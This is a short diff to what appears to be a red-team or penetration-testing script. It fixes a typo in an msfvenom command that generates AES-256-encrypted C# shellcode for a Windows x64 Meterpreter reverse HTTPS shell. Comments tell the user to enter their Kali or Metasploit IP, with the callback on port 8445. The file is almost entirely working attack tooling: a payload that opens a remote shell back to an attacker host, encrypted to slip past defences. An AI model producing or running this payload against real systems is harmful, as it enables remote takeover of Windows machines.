@@ -1,3 +1,3 @@
 # please change {IP_ADDR} to the IP Address of you kali linux or machine using metasploit
 # this code will generate a meterpreter shell via reverse https with your ip and it will be encrypted with the aes256 algorithm and will create a file with the name shellcode.cs
-msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST={IP_ADDR} LPORT=8445 -f csharp -o shellcode.cs --enrypt aes256 --encrypt-key 1ThisShouldBeThirtyTwoBytesLong1 --encrypt-iv 94dff9c699e9e849
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST={IP_ADDR} LPORT=8445 -f csharp -o shellcode.cs --encrypt aes256 --encrypt-key 1ThisShouldBeThirtyTwoBytesLong1 --encrypt-iv 94dff9c699e9e849
